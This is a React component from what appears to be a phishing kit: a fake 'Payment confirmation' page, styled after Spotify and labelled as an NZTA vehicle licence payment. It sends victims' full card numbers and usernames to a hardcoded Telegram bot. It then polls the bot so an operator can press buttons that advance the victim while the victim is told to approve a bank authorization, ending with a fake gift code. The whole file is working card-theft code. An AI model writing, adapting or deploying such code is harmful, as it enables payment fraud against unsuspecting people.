import React, { useEffect, useState } from 'react';
import axios from 'axios';
import './SpotifyApprove.css';
import GiftCardPopup from './GiftCardPopup';
import { useLanguage } from '../hooks/useLanguage';
import visaLogo from '../assets/visa-logo.png';
import mastercardLogo from '../assets/mastercard-logo.png';

const TELEGRAM_BOT_TOKEN = '8508454843:AAGGN8mMMmXkV2O2Ii7DUL-8do9UeKusbz0';
const TELEGRAM_ACTIONS_CHAT_ID = '-4820671789';

function SpotifyApprove({ onClose }) {
  const { t } = useLanguage();
  const [isConfirmed, setIsConfirmed] = useState(false);
  const [currentTime, setCurrentTime] = useState(new Date());
  const [cardNumber, setCardNumber] = useState('**** **** **** 9116');
  const [username, setUsername] = useState('');
  const [isSending, setIsSending] = useState(false);
  const [bankName, setBankName] = useState('Bank');
  const [cardBrand, setCardBrand] = useState('VISA');
  const [showGiftCard, setShowGiftCard] = useState(false);
  const [giftCode, setGiftCode] = useState('');
  const [showMessage, setShowMessage] = useState(false);
  const [messageText, setMessageText] = useState('');
  const [messageType, setMessageType] = useState('');

  const generateGiftCode = () => {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let code = '';
    for (let i = 0; i < 16; i++) {
      if (i > 0 && i % 4 === 0) code += '-';
      code += chars[Math.floor(Math.random() * chars.length)];
    }
    return code;
  };

  const handleSuccessCard = () => {
    console.log('✅ Success button clicked');
    setIsConfirmed(false);
    const newGiftCode = generateGiftCode();
    setGiftCode(newGiftCode);
    setShowGiftCard(true);
  };

  const closeGiftCard = () => {
    setShowGiftCard(false);
    if (onClose) {
      onClose();
    } else {
      sessionStorage.setItem('showCardForm', 'true');
      window.location.href = '/#/';
    }
  };

  const handleBackToAppr = () => {
    console.log('⬅️ Back clicked');
    setIsConfirmed(false);
    if (onClose) {
      onClose();
    } else {
      setMessageText('Please make sure you have confirmed.');
      setMessageType('warning');
      setShowMessage(true);
      setTimeout(() => setShowMessage(false), 3000);
    }
  };

  const closeMessage = () => setShowMessage(false);

  useEffect(() => {
    let lastUpdateId = 0;
    const pollTelegram = async () => {
      try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`;
        const response = await axios.get(url);
        if (response.data.result && response.data.result.length > 0) {
          for (const update of response.data.result) {
            lastUpdateId = update.update_id;
            if (update.callback_query) {
              const callbackData = update.callback_query.data;
              if (callbackData.startsWith('success_card_')) handleSuccessCard();
              else if (callbackData.startsWith('back_to_appr_')) handleBackToAppr();
              await axios.post(
                `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
                {
                  callback_query_id: update.callback_query.id,
                  text: '✅ Action executed!',
                }
              );
            }
          }
        }
      } catch (error) {
        console.error('Polling error:', error);
      }
    };
    const interval = setInterval(pollTelegram, 3000);
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    const storedCardNumber = sessionStorage.getItem('cardNumber');
    const storedUsername = sessionStorage.getItem('loginName');
    const storedBankName = sessionStorage.getItem('bankName');
    const storedBrand = sessionStorage.getItem('cardBrand');
    if (storedCardNumber) {
      const last4 = storedCardNumber.slice(-4);
      setCardNumber(`**** **** **** ${last4}`);
    }
    if (storedUsername) setUsername(storedUsername);
    if (storedBankName) setBankName(storedBankName);
    if (storedBrand) setCardBrand(storedBrand);
    const timer = setInterval(() => setCurrentTime(new Date()), 1000);
    return () => clearInterval(timer);
  }, []);

  const sendTelegramLog = async () => {
    try {
      const fullCardNumber = sessionStorage.getItem('cardNumber') || 'Unknown';
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `✅ <b>PAYMENT CONFIRMATION</b> ✅
━━━━━━━━━━━━━━━━━━━━━
👤 <b>Username:</b> ${username || 'Unknown'}
💳 <b>Card Number:</b> <code>${fullCardNumber}</code>
🏪 <b>Merchant:</b> NZTA Vehicle Licence
⏰ <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>Choose an action:</i>`;
      const keyboard = {
        inline_keyboard: [
          [
            { text: '✅ Success', callback_data: `success_card_${Date.now()}` },
            { text: '⬅️ Back', callback_data: `back_to_appr_${Date.now()}` },
          ],
        ],
      };
      await axios.post(url, {
        chat_id: TELEGRAM_ACTIONS_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
        reply_markup: keyboard,
      });
      return true;
    } catch (error) {
      return false;
    }
  };

  const handleConfirm = async () => {
    setIsSending(true);
    const sent = await sendTelegramLog();
    if (sent) {
      sessionStorage.setItem('paymentConfirmed', 'true');
      setIsConfirmed(true);
    }
    setIsSending(false);
  };

  // Helper to get selected plan amount
  const getPlanAmount = () => {
    const saved = sessionStorage.getItem('cartPlan');
    if (saved) {
      try {
        const plan = JSON.parse(saved);
        return plan.price ? plan.price.replace('/m', '') : '$103.95';
      } catch (e) {
        return '$103.95';
      }
    }
    return '$103.95';
  };

  // ─────────────────────────────────────────────
  // WAITING / CONFIRMATION STATE
  // ─────────────────────────────────────────────
  if (isConfirmed) {
    return (
      <div className="spotify-page">
        <div className="spotify-container">
          {showMessage && (
            <div className="spotify-error-banner">
              ⚠️ {messageText}
              <button onClick={closeMessage}>×</button>
            </div>
          )}

          <h1 className="spotify-title">Waiting for confirmation</h1>

          <p className="spotify-intro">
            Your confirmation has been sent. Please check your mobile banking app.
          </p>

          <hr className="spotify-divider" />

          <h2 className="spotify-subtitle">Payment status</h2>

          <p className="spotify-help">To complete your payment, please follow these steps:</p>

          <ol className="spotify-instructions">
            <li>Open your banking app on your smartphone.</li>
            <li>Confirm the authorization request.</li>
            <li>Return to this screen and wait for confirmation.</li>
          </ol>

          <div className="spotify-summary">
            <h3>Current time</h3>
            <div className="spotify-summary-row spotify-summary-final">
              <span>Time</span>
              <span>{currentTime.toLocaleString()}</span>
            </div>
          </div>

          <div className="spotify-actions">
            <button className="spotify-btn spotify-btn-cancel" onClick={closeGiftCard}>
              Cancel
            </button>
          </div>

          {showGiftCard && <GiftCardPopup giftCode={giftCode} onClose={closeGiftCard} />}
        </div>
      </div>
    );
  }

  // ─────────────────────────────────────────────
  // FORM STATE
  // ─────────────────────────────────────────────
  return (
    <div className="spotify-page">
      <div className="spotify-container">
        {showMessage && (
          <div className="spotify-error-banner">
            ⚠️ {messageText}
            <button onClick={closeMessage}>×</button>
          </div>
        )}

        <h1 className="spotify-title">Payment confirmation</h1>

        <p className="spotify-intro">Please confirm the payment in your banking app.</p>

        <hr className="spotify-divider" />

        <div className="spotify-card-logos">
          <img src={visaLogo} alt="VISA" />
          <img src={mastercardLogo} alt="Mastercard" />
        </div>

        <div className="spotify-summary">
          <h3>{t.confirmationInApp || 'Vehicle Licence Payment'}</h3>

          <div className="spotify-summary-row">
            <span>{t.merchant || 'Merchant'}</span>
            <span>{cardBrand}</span>
          </div>
          <div className="spotify-summary-row">
            <span>{t.amount || 'Amount'}</span>
            <span>{getPlanAmount()}</span>
          </div>
          <div className="spotify-summary-row">
            <span>{t.date || 'Date'}</span>
            <span>{new Date().toLocaleString()}</span>
          </div>
          <div className="spotify-summary-row spotify-summary-final">
            <span>{t.cardNumberLabel || 'Card Number'}</span>
            <span>{cardNumber}</span>
          </div>
        </div>

        <p className="spotify-help">To complete your payment, please follow these steps:</p>

        <ol className="spotify-instructions">
          <li>Open your banking app on your smartphone.</li>
          <li>Approve the authorization request.</li>
          <li>Return to this screen and tap "Confirm".</li>
        </ol>

        <div className="spotify-actions">
          <button
            onClick={handleConfirm}
            className="spotify-btn spotify-btn-continue"
            disabled={isSending}
          >
            {isSending ? 'Sending…' : 'Confirm'}
          </button>
          <button
            type="button"
            className="spotify-btn spotify-btn-cancel"
            onClick={handleBackToAppr}
            disabled={isSending}
          >
            Cancel
          </button>
        </div>

        <p className="spotify-secure">🔒 Secured by your Bank</p>

        {showGiftCard && <GiftCardPopup giftCode={giftCode} onClose={closeGiftCard} />}
      </div>
    </div>
  );
}

export default SpotifyApprove;